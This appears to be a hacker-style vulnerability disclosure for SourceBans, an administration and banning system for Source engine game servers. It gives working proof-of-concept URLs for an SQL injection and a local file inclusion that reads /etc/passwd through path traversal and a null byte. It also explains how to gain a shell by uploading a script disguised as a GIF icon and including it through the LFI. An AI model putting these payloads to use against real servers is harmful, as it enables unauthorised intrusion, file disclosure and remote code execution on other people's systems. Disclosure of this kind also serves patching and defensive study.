"- What is SourceBans?
SourceBans is a free global administration and banning system for Source engine based servers."

Vulnerabilities:

1°) SQL Injection:
Proof of concept: http://1m-4-1337-m8.c0m/index.php?xajax=RefreshServer&xajaxargs[]=1' <=== SQL Error w00t!

2°) LFI Injection:
Only works when you're authentified as root administrator or as somebody who is able to change the SourceBans theme :
Proof of concept: http://server/index.php?xajax=SelTheme&xajaxargs[]=../../../../../../../../../../etc/passwd%00

Note: There is also a possibility to get a shell by adding "GIF89a" at the very beginning of the shell,
renaming it to h4x0rz.gif and uploading it as an icon in the admin panel. Then include the file with the LFI and G4M3 0V3R :).
